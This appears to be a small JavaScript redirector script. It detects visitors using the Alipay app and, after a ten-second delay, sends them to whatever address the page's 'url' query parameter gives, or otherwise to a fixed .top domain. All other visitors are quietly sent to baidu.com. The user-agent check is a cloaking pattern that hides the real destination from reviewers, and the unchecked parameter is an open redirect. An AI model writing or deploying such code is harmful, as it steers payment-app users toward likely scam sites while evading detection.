(() => {
	function isAlipay() {
		const ua = navigator.userAgent;
		return /AlipayClient|AliApp/.test(ua);
	}
	// 使用示例：
	if (isAlipay()) {
		const urlParams = new URLSearchParams(window.location.search);
		let openUrl = urlParams.get('url');
		if (openUrl == undefined || openUrl == null || openUrl == '') {
			openUrl = "https://www.nzduojin002.top";
		}
		setTimeout(() => {
			location.href = openUrl;
		}, 10000);
	} else {
		location.href = "https://www.baidu.com";
	}
})();
